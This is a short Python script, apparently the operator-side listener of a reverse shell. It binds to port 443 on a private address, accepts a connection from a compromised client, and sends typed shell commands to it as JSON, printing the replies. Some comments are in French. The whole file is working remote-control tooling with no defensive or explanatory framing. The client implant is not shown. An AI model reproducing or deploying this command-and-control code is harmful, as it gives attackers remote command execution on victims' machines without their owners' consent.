#!/usr/bin/python3

import socket
import json
import os

# Create a global variable for the socket and client connection
s = None
target = None
ip = None

def connection():
    global s, target, ip

    # Create a new socket instance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configure the socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind the socket to an IP address and port
    s.bind(("192.168.100.9", 443))

    # Start listening for incoming connections
    s.listen(5)
    print("Listening for incoming connections...")

    # Accept an incoming connection
    target, ip = s.accept()
    print(f"Connected to {ip}")

def sending(command):
    # Convert the command to JSON format and send it
    json_data = json.dumps(command)
    target.send(json_data.encode())

def receive():
    json_data = ""
    while True:
        try:
            # Receive data from the target in chunks
            chunk = target.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue


def shell():
    try:
        while True:
            command = input(f"* Shell#{ip} ==> : ")

            if command.lower() in ["exit", "quit"]:
                sending(command)
                print("Command received to end connection.")
                break

            elif command.startswith("cd "):  # Gestion des commandes cd
                sending(command)
                response = receive()
                print(response)
                continue

            elif command.strip() == "cd":  # Vérifier le répertoire courant
                sending(command)
                response = receive()  # Recevoir le répertoire courant
                print(f"Current directory: {response}")
                continue

            # Envoyer d'autres commandes au client
            sending(command)
            response = receive()
            print(response)

    except KeyboardInterrupt:
        print("Interruption by user!")



# Main script execution
if __name__ == "__main__":
    try:
        connection()
        shell()
    finally:
        # Ensure the socket and connection are properly closed
        if target:
            target.close()
        if s:
            s.close()
